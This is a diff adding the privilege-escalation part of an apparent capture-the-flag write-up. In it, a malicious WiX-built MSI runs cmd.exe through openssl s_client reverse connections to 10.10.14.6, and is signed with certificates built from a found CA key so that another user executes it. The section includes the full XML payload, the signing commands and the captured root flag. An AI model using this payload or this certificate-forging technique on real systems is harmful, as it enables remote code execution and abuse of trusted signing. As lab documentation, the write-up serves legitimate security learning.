@@ -140,6 +140,92 @@ Once we have the connection we can now read the user flag.
 type c:\users\jorge\desktop\user.txt
 2b9a4ca09408b4a39d87cbcd7bd524dd
  
+Now onto PRIVILEGE SCALATION
+
+Enumeration took us to D:\ volume there was a file located in D:\DEV\MSI\note.txt that was from user etherea\rupal
+Please drop MSIs that need testing into this folder - I will review regularly.
+Certs have been added to the store already.
+- Rupal
+
+Now we know we need to generate an evil.msi file to put in that folder for rupal "test"
+
+so we can generate one msi file like this:
+########################################################################################
+<?xml version="1.0"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product
+Name" Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
+<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer
+Package"/>
+<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
+<Directory Id="TARGETDIR" Name="SourceDir">
+<Directory Id="ProgramFilesFolder">
+<Directory Id="INSTALLLOCATION" Name="Example">
+<Component Id="ApplicationFiles"
+Guid="12345678-1234-1234-1234-222222222222">
+<File Id="ApplicationFile1" Source="D:\Windows\tracing\test.txt"/>
+</Component>
+</Directory>
+</Directory>
+</Directory>
+<Feature Id="DefaultFeature" Level="1">
+<ComponentRef Id="ApplicationFiles"/>
+</Feature>
+<CustomAction Id="SystemShell" Directory="TARGETDIR" ExeCommand="cmd.exe /c
+C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.6:73| cmd.exe |
+C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.6:136"
+Execute="deferred" Impersonate="yes" Return="ignore"/>
+<CustomAction Id="FailInstall" Execute="deferred" Script="vbscript" Return="check">
+invalid vbs to fail install
+</CustomAction>
+<InstallExecuteSequence>
+<Custom Action="SystemShell" After="InstallInitialize"></Custom>
+<Custom Action="FailInstall" Before="InstallFiles"></Custom>
+</InstallExecuteSequence>
+</Product>
+</Wix>
+##############################################################################
+I used the wix tool set (which can be found at http://wixtoolset.org/releases/ ) on
+my windows vm to compile the msi xml file shown above.
+
+I used candle.exe on the msi xml file above which created payload.wixobj
+
+then light.exe payload.wixobj which creates the compiled payload.msi
+
+I had to download the certs rupal mentioned in his note so I could sign my malicious .msi
+file. The certs were in the D:\certs folder, MyCA.cer and MyCA.pvk
+
+I was able to use the certs to sign my malicious msi file using:
+pvk2pfx -pvk C:\temp\MyCa.pvk -spc C:\temp\MyCa.cer -pfx C:\temp\MyCa.pfx
+which created the MyCA.pfx file that includes the cer and pvk
+
+makecert -pe -n "CN=My SPC" -a sha256 -cy end -sky signature -ic
+C:\temp\MyCA.cer -iv c:\temp\MyCA.pvk -sv C:\temp\MySPC.pvk c:\temp\MySPC.cer
+which creates a new MySPC.cer and MySPC.pvk for signing
+
+pvk2pfx -pvk C:\temp\MySPC.pvk -spc C:\temp\MySPC.cer -pfx C:\temp\M
+ySPC.pfx
+which uses the new cer and pvk files to create my own pfx
+
+signtool sign /v /n "Me" /s SPC C:\file.msi
+and finally sign the msi payload file
+
+I uploaded my payload msi to C:\windows\tracing\ so that I could copy it to the
+D:\DEV\MSIs folder as needed.
+
+When an msi file is uploaded to the D:\DEV\MSIs folder, every few minutes rupal “tests”
+the file and then deletes all msi files in D:\DEV\MSIs.
+
+As soon as I copy the msi file with the openssl command, I have to VERY QUICKLY :
+● exit out of the openssl connection I have as jorge
+● enter the openssl command to wait for a connection again on port 73
+● and then type or paste in a command to be run as rupal.
+
+If done correctly, you will see the command run as rupal.
+The command I used was a simple:
+type C:\Users\rupal\Desktop\root.txt
+
+root flag: 1cb6f1fc220e3f2fcc0e3cd8e2d9906f
  
  
 *************************************************************
